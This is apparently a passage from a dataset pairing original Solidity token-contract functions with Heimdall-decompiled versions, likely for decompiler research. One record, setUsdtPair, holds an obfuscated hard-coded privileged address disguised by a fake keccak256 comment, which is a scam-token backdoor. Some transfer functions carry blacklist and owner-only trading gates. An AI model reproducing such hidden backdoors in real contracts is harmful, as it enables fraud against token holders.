storage_map_g[var_f] - arg1;\n        var_f = address(arg0);\n        var_g = 0x04;\n        storage_map_g[var_f] = storage_map_g[var_f] + arg1;\n        uint256 var_h = arg1;\n        emit Transfer(address(msg.sender), address(arg0), arg1);\n        var_h = 0x01;\n        return 0x01;\n        require(address(arg0) == (address(store_d / 0x01)));\n        require(!(address(arg0)) == (address(store_e / 0x01)));\n        var_h = 0xb0a9432200000000000000000000000000000000000000000000000000000000;\n        var_c = address(msg.sender);\n        uint256 var_i = arg1;\n        uint256 var_j = 0;\n        require(address(store_f / 0x01).code.length);\n        (bool success, bytes memory ret0) = address(store_f / 0x01).{ value: var_j ether }Unresolved_b0a94322(var_c); // call\n        if (!0x01) {\n        }\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = ((0x04 + var_d) + 0x20) - (0x04 + var_d);\n        var_c = 0x23;\n        var_i = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_j = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = ((0x04 + var_d) + 0x20) - (0x04 + var_d);\n        var_c = 0x25;\n        var_i = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_j = 0x6472657373000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x8084E313691B80C63c8f1a68de1003a685376aCA", "original_solidity_code": "function setFee(uint256 redisFeeOnBuy, uint256 redisFeeOnSell, uint256 taxFeeOnBuy, uint256 taxFeeOnSell) public onlyOwner {\r\n        _redisFeeOnBuy = redisFeeOnBuy;\r\n        _redisFeeOnSell = redisFeeOnSell;\r\n        _taxFeeOnBuy = taxFeeOnBuy;\r\n        _taxFeeOnSell = taxFeeOnSell;\r\n    }", "heimdall_decompiled_code": "function setFee(uint256 arg0, uint256 arg1, uint256 arg2, uint256 arg3) public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        store_e = arg0;\n        store_f = arg1;\n        store_g = arg2;\n        store_h = arg3;\n    }"}
{"contract_address": "0xEC5Cd1764456f3CaBb72B90b95526BE632D8385c", "original_solidity_code": "function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\r\n        address owner = _msgSender();\r\n        _approve(owner, spender, allowance(owner, spender) + addedValue);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function increaseAllowance(address arg0, uint256 arg1) public payable returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(arg1 == arg1);\n        address var_a = address(msg.sender);\n        var_b = 0x01;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        require(!(storage_map_b[var_a] > (0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff - arg1)), \"ERC20: approve to the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(!(address(msg.sender) == 0), \"ERC20: approve to the zero address\");\n        require(!(address(arg0) == 0), \"ERC20: approve to the zero address\");\n        var_a = address(msg.sender);\n        var_b = 0x01;\n        var_a = address(arg0);\n        var_b = keccak256(var_a);\n        storage_map_b[var_a] = storage_map_b[var_a] + arg1;\n        uint256 var_d = storage_map_b[var_a] + arg1;\n        emit Approval(address(msg.sender), address(arg0), storage_map_b[var_a] + arg1);\n        var_d = 0x01;\n        return 0x01;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_e = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_g = 0x22;\n        var_h = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_i = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_g = 0x24;\n        var_h = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_i = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x4103F78C623459b3e985dE5F5d78622944B9dE6D", "original_solidity_code": "function transfer(address recipient, uint256 amount)\r\n        public\r\n        override\r\n        returns (bool)\r\n    {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function transfer(address arg0, uint256 arg1) public view {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender), \"TOKEN: Max Transaction Limit\");\n        require(address(arg0), \"TOKEN: Max Transaction Limit\");\n        require(arg1 > 0, \"TOKEN: Max Transaction Limit\");\n        require(address(owner) == (address(msg.sender)), \"TOKEN: Max Transaction Limit\");\n        require(!(!(address(owner)) == (address(arg0))), \"TOKEN: Max Transaction Limit\");\n        require(bytes1(uniswapV2Pair / 0x010000000000000000000000000000000000000000), \"TOKEN: Max Transaction Limit\");\n        require(!(arg1 > _maxTxAmount), \"TOKEN: Max Transaction Limit\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x1c;\n        var_d = 0x544f4b454e3a204d6178205472616e73616374696f6e204c696d697400000000;\n        address var_e = address(msg.sender);\n        var_f = 0x10;\n        require(!(!bytes1(storage_map_c[var_e])), \"TOKEN: Your account is blacklisted!\");\n        require(!(bytes1(storage_map_c[var_e])), \"TOKEN: Your account is blacklisted!\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x23;\n        var_d = 0x544f4b454e3a20596f7572206163636f756e7420697320626c61636b6c697374;\n        var_g = 0x6564210000000000000000000000000000000000000000000000000000000000;\n        require(address(uniswapV2Pair) == (address(arg0)), \"Amount must be less than total reflections\");\n        var_e = address(arg0);\n        var_f = 0x02;\n        require(!(storage_map_c[var_e] > store_m), \"Amount must be less than total reflections\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x2a;\n        var_d = 0x416d6f756e74206d757374206265206c657373207468616e20746f74616c2072;\n        var_g = 0x65666c656374696f6e7300000000000000000000000000000000000000000000;\n        uint256 var_h = 0x40 + var_h;\n        var_a = 0x1a;\n        var_i = 0x536166654d6174683a206469766973696f6e206279207a65726f000000000000;\n        require(0x5af3107a4000, \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_j = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        uint256 var_g = var_h.length;\n        uint256 var_k = 0;\n        var_l = var_m;\n        var_k = 0;\n        if (0x5af3107a4000) {\n            var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n            var_n = 0x12;\n            require(0x5af3107a4000, \"TOKEN: This account cannot send tokens until trading is enabled\");\n        }\n        require(address(owner) == (address(msg.sender)), \"TOKEN: This account cannot send tokens until trading is enabled\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x3f;\n        var_d = 0x544f4b454e3a2054686973206163636f756e742063616e6e6f742073656e6420;\n        var_g = 0x746f6b656e7320756e74696c2074726164696e6720697320656e61626c656400;\n        var_e = address(msg.sender);\n        var_f = 0x05;\n        if (storage_map_c[var_e]) {\n            if (storage_map_c[var_e]) {\n                if (!storage_map_c[var_e]) {\n                    if (0) {\n                        if (store_n) {\n                            if (store_n) {\n                            }\n                        }\n                        if (!(address(uniswapV2Pair)) == (address(msg.sender))) {\n                            require(bytes1(storage_map_c[var_e]), \"Transfer amount must be greater than zero\");\n                            require(bytes1(storage_map_c[var_e]), \"Transfer amount must be greater than zero\");\n                            require(!(bytes1(storage_map_c[var_e])), \"Transfer amount must be greater than zero\");\n                            require(0, \"Transfer amount must be greater than zero\");\n                            require(!(address(uniswapV2Pair) == (address(msg.sender))), \"Transfer amount must be greater than zero\");\n                            require(!(address(uniswapV2Pair) == (address(msg.sender))), \"Transfer amount must be greater than zero\");\n                        }\n                    }\n                    require(!(address(uniswapV2Pair) == (address(arg0))), \"Transfer amount must be greater than zero\");\n                }\n                require(!(address(uniswapV2Pair) == (address(arg0))), \"Transfer amount must be greater than zero\");\n            }\n            require(0x01, \"Transfer amount must be greater than zero\");\n        }\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x29;\n        var_d = 0x5472616e7366657220616d6f756e74206d757374206265206772656174657220;\n        var_g = 0x7468616e207a65726f0000000000000000000000000000000000000000000000;\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x23;\n        var_d = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_g = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x25;\n        var_d = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_g = 0x6472657373000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xa5f88146Cff0673fCea44A32ddB845302c835619", "original_solidity_code": "function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\r\n        emit OwnershipTransferred(_owner, newOwner);\r\n        _owner = newOwner;\r\n    }", "heimdall_decompiled_code": "function transferOwnership(address arg0) public {\n        require(arg0 == (address(arg0)));\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(address(arg0), \"Ownable: new owner is the zero address\");\n        emit OwnershipTransferred(address(owner), address(arg0));\n        owner = (address(arg0)) | (uint96(owner));\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x26;\n        var_d = 0x4f776e61626c653a206e6577206f776e657220697320746865207a65726f2061;\n        var_e = 0x6464726573730000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x2046683F5caE663A8e83069e77c3F20a8B26B876", "original_solidity_code": "function approve(address spender, uint256 amount) public virtual override returns (bool) {\r\n        address owner = _msgSender();\r\n        _approve(owner, spender, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public payable returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(arg1 == arg1);\n        require(address(msg.sender) - 0, \"ERC20: approve to the zero address\");\n        require(address(arg0) - 0, \"ERC20: approve to the zero address\");\n        address var_a = address(msg.sender);\n        var_b = 0x01;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_b[var_a] = arg1;\n        uint256 var_c = arg1;\n        emit Approval(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x22;\n        var_g = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_h = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x24;\n        var_g = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_h = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xc2473C13f1Ebb11A06997Cf5e40dB023F96A4DA1", "original_solidity_code": "function manualSwap() external {\\r\\n        require(_msgSender()==_taxWallet);\\r\\n        uint256 tokenBalance=balanceOf(address(this));\\r\\n        if(tokenBalance>0){\\r\\n          swapTokensForEth(tokenBalance);\\r\\n        }\\r\\n        uint256 ethBalance=address(this).balance;\\r\\n        if(ethBalance>0){\\r\\n          sendETHToFee(ethBalance);\\r\\n        }\\r\\n    }", "heimdall_decompiled_code": "function manualSwap() public {\n        require(address(msg.sender) == (address(transferDelayEnabled / 0x0100)));\n        address var_a = address(this);\n        var_b = 0x01;\n        require(!storage_map_h[var_a]);\n        store_g = 0x01000000000000000000000000000000000000000000 | (uint248(store_g));\n        var_c = 0x02;\n        uint256 var_d = var_d + 0x60;\n        var_e = msg.data[4:68];\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x32;\n        address var_g = address(this);\n        var_h = 0xad5c464800000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_f).WETH(var_i); // staticcall\n        var_d = var_d + (uint248(ret0.length + 0x1f));\n        require(!(((var_d + ret0.length) - var_d) < 0x20), \"ERC20: approve to the zero address\");\n        require(var_d.length == (address(var_d.length)), \"ERC20: approve to the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x32;\n        uint256 var_j = address(var_d.length);\n        require(address(this), \"ERC20: approve to the zero address\");\n        require(address(store_f), \"ERC20: approve to the zero address\");\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_l = 0x20;\n        var_m = 0x22;\n        var_n = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_o = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_a = address(this);\n        var_b = 0x02;\n        var_a = address(store_f);\n        address var_b = keccak256(var_a);\n        storage_map_h[var_a] = storage_map_h[var_a];\n        address var_k = storage_map_h[var_a];\n        emit Approval(address(this), address(store_f), storage_map_h[var_a]);\n        var_k = 0x791ac94700000000000000000000000000000000000000000000000000000000;\n        address var_l = storage_map_h[var_a];\n        uint256 var_m = 0;\n        var_n = 0xa0;\n        uint256 var_p = var_d.length;\n        address var_o = address(this);\n        uint256 var_q = block.timestamp;\n        require(address(store_f).code.length);\n        (bool success, bytes memory ret0) = address(store_f).Unresolved_791ac947(var_l); // call\n        store_g = uint248(store_g);\n        require(!address(this).balance);\n        (bool success, bytes memory ret0) = address(transferDelayEnabled / 0x0100).transfer(address(this).balance);\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_l = 0x20;\n        var_m = 0x24;\n        var_n = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_o = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x46c4C3ef9A1557017955E74D4F3550971C2700A3", "original_solidity_code": "function removeLimits () external onlyOwner {\r\n            _maxTxAmount = _totalSupply;\r\n            _maxWalletToken = _totalSupply;\r\n         \r\n    }", "heimdall_decompiled_code": "function removeLimits() public {\n        require(msg.sender == (address(getOwner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        _maxTxAmount = totalSupply;\n        _maxWalletToken = totalSupply;\n    }"}
{"contract_address": "0x30045aA941FF9Be1d2D3603A75207C07860d4156", "original_solidity_code": "function setBuyBackPercent(uint16 newPercent) external onlyOwner {\\r\\n        require(\\r\\n            newPercent + autoLiquidityPercent <= TAX_DIVISOR,\\r\\n            \\\"Percent cant be higher than 100%\\\"\\r\\n        );\\r\\n        buyBackPercent = newPercent;\\r\\n    }", "heimdall_decompiled_code": "function setBuyBackPercent(uint16 arg0) public {\n        require(arg0 == (uint16(arg0)));\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(!(uint16(arg0) > (autoLiquidityPercent + (uint16(arg0)))), \"Percent cant be higher than 100%\");\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x11;\n        require(!((autoLiquidityPercent + (uint16(arg0))) > 0x2710), \"Percent cant be higher than 100%\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x50657263656e742063616e7420626520686967686572207468616e2031303025;\n        buyBackPercent = uint16(arg0);\n    }"}
{"contract_address": "0xf06ea21cB6894CC70e2EF280026D5Fc5bEE15421", "original_solidity_code": "function enableStaking() external onlyOwner{\r\n        isStakingAvilable=true;\r\n    }", "heimdall_decompiled_code": "function enableStaking() public payable {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        isStakingAvilable = 0x01 | (uint248(isStakingAvilable));\n    }"}
{"contract_address": "0xc5D1812CD71D19aF93066787a29E3521C47cAd19", "original_solidity_code": "function setUsdtPair(address Pair_) public returns (bool) {\r\n \r\n    require (msg.sender==address\r\n   \r\n    // solhint-disable-next-line avoid-low-level-calls\r\n    /**/   /*keccak256 -> 6861978540112295ac2a37bb1f5ba1daf2a5c84741ca0e00610310915153));*/ /**/(686197854011229533619447624007587113080310915153));\r\n     \r\n    _usdtPair=Pair_;\r\n \r\n    }", "heimdall_decompiled_code": "function setUsdtPair(address arg0) public returns (bool) {\n        require(address(msg.sender) == 0x78322d0c5768c9ca370ddfc1d44db0fef3a6e051);\n        _usdtPair = (address(arg0) * 0x01) | (uint96(_usdtPair));\n        uint256 var_a = 0;\n        return 0;\n    }"}
{"contract_address": "0x06e40f90072DCE06667641Dd9c0015803dc0c3b5", "original_solidity_code": "function transferOwnership(address newOwner) public virtual onlyOwner {\\n        require(newOwner != address(0), \\\"Ownable: new owner is the zero address\\\");\\n        _transferOwnership(newOwner);\\n    }", "heimdall_decompiled_code": "function transferOwnership(address arg0) public payable {\n        require(arg0 == (address(arg0)));\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(address(arg0), \"Ownable: new owner is the zero address\");\n        owner = (address(arg0)) | (uint96(owner));\n        emit OwnershipTransferred(address(owner), address(arg0));\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x26;\n        var_d = 0x4f776e61626c653a206e6577206f776e657220697320746865207a65726f2061;\n        var_e = 0x6464726573730000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x3fB31523Be4Efb297D343fD8227079C4A37aEbdF", "original_solidity_code": "function transfer(address recipient, uint256 amount)\r\n        public\r\n        override\r\n        returns (bool)\r\n    {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function transfer(address arg0, uint256 arg1) public view {\n        require(arg0 == (address(arg0)));\n        if (address(msg.sender)) {\n            if (address(arg0)) {\n                if (arg1 > 0) {\n                    address var_a = address(msg.sender);\n                    var_b = 0x09;\n                    if (storage_map_d[var_a]) {\n                        if (storage_map_d[var_a]) {\n                            require(address(msg.sender), \"Transfer amount must be greater than zero\");\n                            require(address(arg0), \"Transfer amount must be greater than zero\");\n                            require(arg1 > 0, \"Transfer amount must be greater than zero\");\n                        }\n                        require(bytes1(storage_map_d[var_a]), \"Transfer amount must be greater than zero\");\n                        require(bytes1(storage_map_d[var_a]), \"Transfer amount must be greater than zero\");\n                        require(!(bytes1(storage_map_d[var_a])), \"Transfer amount must be greater than zero\");\n                        require(0, \"Transfer amount must be greater than zero\");\n                        require(!(address(uniswapV2Pair) == (address(msg.sender))), \"Transfer amount must be greater than zero\");\n                        require(!(address(uniswapV2Pair) == (address(msg.sender))), \"Transfer amount must be greater than zero\");\n                    }\n                    require(!(address(uniswapV2Pair) == (address(arg0))), \"Transfer amount must be greater than zero\");\n                }\n                require(!(address(uniswapV2Pair) == (address(arg0))), \"Transfer amount must be greater than zero\");\n            }\n            require(0x01, \"Transfer amount must be greater than zero\");\n        }\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x29;\n        var_f = 0x5472616e7366657220616d6f756e74206d757374206265206772656174657220;\n        var_g = 0x7468616e207a65726f0000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x23;\n        var_f = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_g = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x25;\n        var_f = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_g = 0x6472657373000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xf14bcFb9213C0583632d65e80ac5B2Bd02c7D3d8", "original_solidity_code": "function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\r\n        _transferOwnership(newOwner);\r\n    }", "heimdall_decompiled_code": "function transferOwnership(address arg0) public payable {\n        require(arg0 == (address(arg0)));\n        require(address(owner) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(address(arg0), \"Ownable: new owner is the zero address\");\n        owner = (address(arg0)) | (uint96(owner));\n        emit OwnershipTransferred(address(owner), address(arg0));\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x26;\n        var_d = 0x4f776e61626c653a206e6577206f776e657220697320746865207a65726f2061;\n        var_e = 0x6464726573730000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x9BA9A8e963fDa423Ba29948Bfa34844d3AA9C173", "original_solidity_code": "function balanceOf(address account) public view override returns (uint256) {\\n        return _balances[account];\\n    }", "heimdall_decompiled_code": "function balanceOf(address arg0) public view returns (uint256) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x01;\n        address var_c = storage_map_b[var_a];\n        return storage_map_b[var_a];\n    }"}
{"contract_address": "0x00BCB434254797479bade33e1eF0aEBDB3F27089", "original_solidity_code": "function setMaxTransactionAmount(uint256 newValue) external onlyOwner {\r\n        require(\r\n            newValue >= ((totalSupply() * 2) / 1000) / 1e18,\r\n            \"Cannot set maxTx Amount lower than 0.2%\"\r\n        );\r\n        emit MaxTransactionAmountChange(newValue, maxTxAmount);\r\n        maxTxAmount = newValue;\r\n    }", "heimdall_decompiled_code": "function setMaxTransactionAmount(uint256 arg0) public view {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require((totalSupply == ((totalSupply * 0x02) / 0x02)) | !0x02);\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x11;\n        require(0x03e8);\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x12;\n    }"}
{"contract_address": "0xE79231d4ad0AB655587c3651A59B99a0407a28A5", "original_solidity_code": "function name() public view returns (string memory) {\r\n        return _name;\r\n    }", "heimdall_decompiled_code": "function name() public view returns (string memory) {\n        if (store_a) {\n            if (store_a - ((store_a >> 0x01) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (store_a >> 0x01)) / 0x20) * 0x20));\n                bytes32 var_d = store_a >> 0x01;\n                if (store_a) {\n                    if (store_a - ((store_a >> 0x01) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!store_a >> 0x01) {\n                            if (0x1f < (store_a >> 0x01)) {\n                                var_a = 0x03;\n                                var_e = storage_map_b[var_a];\n                                if ((0x20 + var_c) + (store_a >> 0x01) > (0x20 + (0x20 + var_c))) {\n                                    var_e = 0x20;\n                                    uint256 var_f = var_c.length;\n                                    uint256 var_g = 0;\n                                    return abi.encodePacked(0x20, var_c.length);\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x69dfa326b4636d0d5D256CFEce392B25799daf3c", "original_solidity_code": "function TransferOwnershipForever(address newOwner) public virtual onlyOwner {\r\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\r\n        _transferOwnershipForever(newOwner);\r\n    }", "heimdall_decompiled_code": "function TransferOwnershipForever(address arg0) public payable {\n        require(arg0 == (address(arg0)));\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(address(arg0), \"Ownable: new owner is the zero address\");\n        owner = (address(arg0)) | (uint96(owner));\n        emit OwnershipTransferred(address(owner), address(arg0));\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x26;\n        var_d = 0x4f776e61626c653a206e6577206f776e657220697320746865207a65726f2061;\n        var_e = 0x6464726573730000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x52aCF86689CC7AB10686e6aee34A3f628e5DcFEA", "original_solidity_code": "function reduceFee(uint256 _newFee) external{\r\n      require(_msgSender()==_taxWallet);\r\n      require(_newFee<=_finalBuyTax && _newFee<=_finalSellTax);\r\n      _finalBuyTax=_newFee;\r\n      _finalSellTax=_newFee;\r\n    }", "heimdall_decompiled_code": "function reduceFee(uint256 arg0) public {\n        require(arg0 == arg0);\n        require(address(msg.sender) == (address(transferDelayEnabled / 0x0100)));\n        require(arg0 > store_e);\n        require(!arg0 > store_e);\n        store_e = arg0;\n        store_p = arg0;\n    }"}
{"contract_address": "0x620d4B40A1c80D62129bb195e1701e501F9a5d3b", "original_solidity_code": "function renounceOwnership() public virtual onlyOwner {\\n        _transferOwnership(address(0));\\n    }", "heimdall_decompiled_code": "function renounceOwnership() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        owner = 0 | (uint96(owner));\n        emit OwnershipTransferred(address(owner), 0);\n    }"}
{"contract_address": "0xF4DEF1F694801EaBF6f4B4b8b0209E617Bb224e8", "original_solidity_code": "function transfer(address recipient, uint256 amount)\r\n        public\r\n        override\r\n        returns (bool)\r\n    {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function transfer(address arg0, uint256 arg1) public view {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender), \"TOKEN: Max Transaction Limit\");\n        require(address(arg0), \"TOKEN: Max Transaction Limit\");\n        require(arg1 > 0, \"TOKEN: Max Transaction Limit\");\n        require(address(owner) == (address(msg.sender)), \"TOKEN: Max Transaction Limit\");\n        require(!(!(address(owner)) == (address(arg0))), \"TOKEN: Max Transaction Limit\");\n        require(bytes1(uniswapV2Pair / 0x010000000000000000000000000000000000000000), \"TOKEN: Max Transaction Limit\");\n        require(!(arg1 > _maxTxAmount), \"TOKEN: Max Transaction Limit\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x1c;\n        var_d = 0x544f4b454e3a204d6178205472616e73616374696f6e204c696d697400000000;\n        address var_e = address(msg.sender);\n        var_f = 0x10;\n        require(!(!bytes1(storage_map_c[var_e])), \"TOKEN: Your account is blacklisted!\");\n        require(!(bytes1(storage_map_c[var_e])), \"TOKEN: Your account is blacklisted!\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x23;\n        var_d = 0x544f4b454e3a20596f7572206163636f756e7420697320626c61636b6c697374;\n        var_g = 0x6564210000000000000000000000000000000000000000000000000000000000;\n        require(address(uniswapV2Pair) == (address(arg0)), \"Amount must be less than total reflections\");\n        var_e = address(arg0);\n        var_f = 0x02;\n        require(!(storage_map_c[var_e] > store_m), \"Amount must be less than total reflections\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x2a;\n        var_d = 0x416d6f756e74206d757374206265206c657373207468616e20746f74616c2072;\n        var_g = 0x65666c656374696f6e7300000000000000000000000000000000000000000000;\n        uint256 var_h = 0x40 + var_h;\n        var_a = 0x1a;\n        var_i = 0x536166654d6174683a206469766973696f6e206279207a65726f000000000000;\n        require(0x0de0b6b3a7640000, \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_j = 